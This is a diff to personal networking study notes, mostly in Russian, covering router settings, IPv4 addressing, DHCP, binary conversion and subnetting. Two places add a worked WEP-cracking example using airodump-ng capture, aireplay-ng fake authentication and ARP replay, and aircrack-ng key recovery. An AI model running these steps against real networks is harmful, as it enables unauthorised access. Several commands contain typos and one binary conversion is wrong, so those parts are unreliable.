@@ -236,6 +236,27 @@ advanced = advanced setup = wireless setings = wps setings # так как эт�
 3 enable wireless isolation   # включить изоляцию frequency and channel частоты и канал у каждого подключения будет изолирован отдельный от всех, станет как switch less like hub
 4 enable mac filtering # фильтрация по мак адресу или доступ только для конкретных мак адресов, но в реальности больше проблем от этого
 5 disable wps setting # обязательно отключить настройку
+############################################################################
+_When Security Fails_
+wep extrimly not secure # если видишь wep сразу меняй на wpa2
+Пример атаки 
+
+1 airdump-ng wlan0mon  #  wlan0mon наша сетевая карта будет искать  и найдет 
+первая строка справа 
+C8:A7:0A:B5:2D:F8 #  там же будет виден канал ch 1 
+
+2 airdump-ng --channel 1 --bssid C8:A7:0A:B5:2D:F8 --write WirelessDump wlan0mon    # указываю канал, потом  bssid указываю мак адрес этой сети, потом указываю write записать в файл  WirelessDump  и потом укзываю сетевую карту 
+
+3 второй терминал
+1 aireplay -ng --fakeauth 0 -a C8:A7:0A:B5:2D:F8 -h 00:CO:CA:84:4C:28 wlan0mon # a мак адресс поддельаунтификация 
+
+2 aireplay -ng --arpreplay b C8:A7:0A:B5:2D:F8 -h 00:CO:CA:84:4C:28 wlan0mon
+
+3 aircrack-ng WirelessDump   # нащ файл с первой команды
+KEY FOUND! [ 17:25:83:AE:FA ]
+172583AEFA    # пароль от нашей сети wifi сети 
+
+
 #############################################################################
 
 
@@ -303,6 +324,15 @@ advanced = advanced setup = wireless setings = wps setings # так как эт�
 							_When Security Fails_
 
 
+							_Section 9: IP Addressing_
+							_IP Addresses_
+							_IPv4 Addressing_
+							_IPv4 Data Flows_
+							_Computer Mathematics_
+							_Subnetting_
+							_Subnetting Practice_
+							_Subneting by Hand_
+							_IPv6 Addresses_
 
 
 ###############################################################################
@@ -1462,4 +1492,215 @@ C8:A7:0A:B5:2D:F8 #  там же будет виден канал ch 1
 
 2 airdump-ng --channel 1 --bssid C8:A7:0A:B5:2D:F8 --write WirelessDump wlan0mon    # указываю канал, потом  bssid указываю мак адрес этой сети, потом указываю write записать в файл  WirelessDump  и потом укзываю сетевую карту 
 
-2:17 
+3 второй терминал
+1 aireplay -ng --fakeauth 0 -a C8:A7:0A:B5:2D:F8 -h 00:CO:CA:84:4C:28 wlan0mon # a мак адресс поддельаунтификация 
+
+2 aireplay -ng --arpreplay b C8:A7:0A:B5:2D:F8 -h 00:CO:CA:84:4C:28 wlan0mon
+
+3 aircrack-ng WirelessDump   # нащ файл с первой команды
+KEY FOUND! [ 17:25:83:AE:FA ]
+172583AEFA    # пароль от нашей сети wifi сети 
+
+4 терминал ifconfig  # смотрю мак адрес wlan0mon первые 12 значений это мак адрес
+00:CO:CA:84:4C:28 # :должны быть двоеточия а тире вставляй в во второй терминал 
+##########################################################################################
+_Section 9: IP Addressing_
+_IP Addresses_
+
+1 Internet Protocol (IP) Address          # пример из лекции это как почтовый адрес дома также и в сети 
+layer 3 ip addresses are used by routers
+
+2 layer 2 it is based on Mac addressing and switching 
+
+3 ipv4 ipv6 
+
+############################################################################################
+_IPv4 Addressing_
+1 4 separate numbers and divided by dots each divisions are called octets
+id address   192.		168.			1.			4 
+
+ip address  11000000  	10101000	000000001     00000100            
+
+Subnet mask    255       255            255          0
+
+Subnet mask  11111111    11111111     11111111       00000000    
+		network bits   network bits   network bits   host bits  
+
+2 Classes of IP Addresses 
+each class has default subnet mask assigned by first octet classfull masks if using default subnet mask
+
+Address       Value in first  Classful Mask         Classful Mask 
+				Octet  		   Dotted decimal       (Prefix Notation)
+Class A         1-126             255.0.0.0            /8
+Class B         128-191           255.255.0.0          /16
+Class C 		192-223           255.255.255.0        /24
+Class D         224-239            n/a                  n/a
+
+127 between class A class B
+
+3 routable ips # publicy-routable ip addresses are globaly managed by ICANN. Public ip покупаются у вашего интернет провайдера.
+ICAN всемирная организация которая продает эти ip (Ripe NCC европейская организация которая дает ip-address)
+
+4 private ips # это приватные ip,которые недоступны во внешней сети
+
+private ips!!!!
+address class       Address range                   default subnet mask 
+Class A        10.0.0.0 - 10.255.255.255.				255.0.0.0
+Class B        172.16.0.0 - 172.31.255.255				255.255.0.0
+Class C        192.168.0.0. - 192.168.255.255.          255.255.255.0
+
+5 specialized ips
+loopback addresses (127.x.x.x range)
+Refer to the device itself and used for testing. These are most commonly used as 127.0.0.1 (localhost) device само устройство и используется только для тестирования как правило 
+
+6 Automate Private Ip Addresses (APIPA)
+Dynamically assigned by OS when DHCP server is unvaible and when address is not assigned manually.Range of 169.254.x.x.
+
+APIPA save you when you have a problem with DHCP
+
+description   Address Class     Address Range                  Default Subnet Mask
+loopback      Class A 			127.0.0.1 - 127.255.255.255.      255.0.0.0
+APIPA         Class B         169.254.0.0 - 169.254.255.255       255.255.0.0
+
+ipconfig # windows 
+ifconfig # linux       
+Если там ты увидишь ip 169.254. значит проблема с DHCP 
+
+7 Class A network address example:
+ip address: 114.56.20.33.
+Subnet Mask 255.0.0.0
+
+Class B network address example:
+ip address: 147.12.38.81.
+Subnet Mask 255.255.0.0
+
+Class C network address example:
+ip address: 214.51.42.7.
+Subnet Mask 255.255.255.0
+#####################################################################
+_IPv4 Data Flows_
+
+1 Unicast одноадресная передача только мы двоем разговаримваем 
+2 Multicast могу разговаривать сразу с двумя тремя личностями
+3 Broadcast data travels from on source to all devices on destination network 
+#########################################################################
+_Assigning IP Addresses_
+1 Static 
+simple 
+time-consuming
+prone to human errors
+impractical for large networks
+
+2 Dynamic 
+Quicker
+Easier
+less confusing
+Simplistic for large networks 
+
+3 Ip address
+  subnet mask 
+  Default gateway 
+  DNS 
+  WINS     windows domain 
+
+4 DHCP Dynamic Host Control Portocol 
+require static database of ip and mac adresses
+give you:
+
+1 ip
+2 subnet mask
+3 Default gateway 
+4 DNS server (or WINS server windows server)
+
+5 give you ip for 30 days max often for few days 
+
+6 Automatic Private Ip Address (APIPA)
+no static ip or on DHCP 
+############################################################
+_Computer Mathematics_
+0101010101 everything
+1  on
+0 off
+2 how to convert from decimal to binary
+
+2 
+128     64     32     16     8		4       2     1
+2**7    2**6   2**5   2**4   2**3   2**2   2**1   2**0
+
+(2**7  в седьмой степени как в питоне )
+
+Пример
+167  convert 167 into decimal 
+167-128 = 39   64 0 39-32 = 7      7-4 = 3  3-2= 1 
+1             
+128     64     32     16     8		4       2     1
+2**7    2**6   2**5   2**4   2**3   2**2   2**1   2**0 
+ 1        0     1       0      0      1     1      0   
+
+ 167 = 10100110
+128 + 32 + 4 + 2 + 1 = 167 # значит мы все правильно посчитали 
+###################################################
+david bombai 
+how to convert decimal to bainary 
+1 binary = 1 in decimal
+ 00000001 in binary = 1 in decimal 
+because 
+#####################################################
+bese    2**7   2**6   2**5   2**4   2**3   2**2   2**1   2**0 
+Binary  0      0       0      0     0     0      0        0
+Decimal 128    64     32     16      8     4      2      1
+####################################################
+1 192 binary конвертация
+Самый простой способ 
+192 -128 = 64       значит 1 
+64 - 64 =0        тут 0 значит 1,   а все остальное из таблицы выше по нулям так как мы дошли до нулей 
+11000000
+
+2 конвертация в байты 253:
+можно сделать так 253 -128 = 125  1
+ 125 - 64 = 61     1 
+ 61 - 32 = 29        1 
+ 29 - 16 = 13       1
+ 13 - 8 = 5         1 
+  5 - 4 = 1        1 
+  2 > 1            значит 0 если число из таблицы более чем то что у нас получилось при вычитании значит это 0
+  1-1 =0          1 
+  Итого: 11111101
+3 Есть способ проще 255-253 = 2  значит 2  = 0 а остальные равны 1 
+Проверка 
+128 + 64 + 32 + 16 + 8 + 4 + 1 = 253 будет равно все норм 
+https://davidbombal.com/decimal-to-binary-quiz/   тут можно переконвертировать 10-чные в байты в онлайне нажав give up 
+https://davidbombal.com/binary-to-decimal-quiz/    # тут также читай по ссылке decimal десятичные, байты в 10-чные 
+
+4 1 decimal = 0000 0001 (binary)
+смотри таблицу 
+###########################################################
+bese    2**7   2**6   2**5   2**4   2**3   2**2   2**1   2**0 
+Binary  0      0       0      0     0     0      0        0
+Decimal 128    64     32     16      8     4      2      1
+
+0 0 0 0 0 0 0 1   # последние только поподает остальны по нулям
+
+5 255 = 1111 1111 (128 + 64 + 32 + 16 + 8 + 4 + 2 + 1)=255
+#################################################################
+_Subnetting_
+large network we split in small networks
+Adress class  Default subnet  Assignable      Assignable 
+				Mask          ip Calculation   ip Addresses
+Class A     255.0.0.0           2**24 - 2 =        16,777,214
+Class B     255.255.0.0         2**16 -2 =          65 534
+Class C     255.255.255.0       2**8 - 2 =           254 
+###############################################################
+_Subnetting Practice_
+CIDR   Sybnets  Ips
+/30     64       4
+/29     32       8
+/28     16       16
+/27     8        32
+/26     4        64
+/25     2        128
+_Subneting by Hand_
+
+192.168.0.85 /29
+#################################################################
+_IPv6 Addresses_
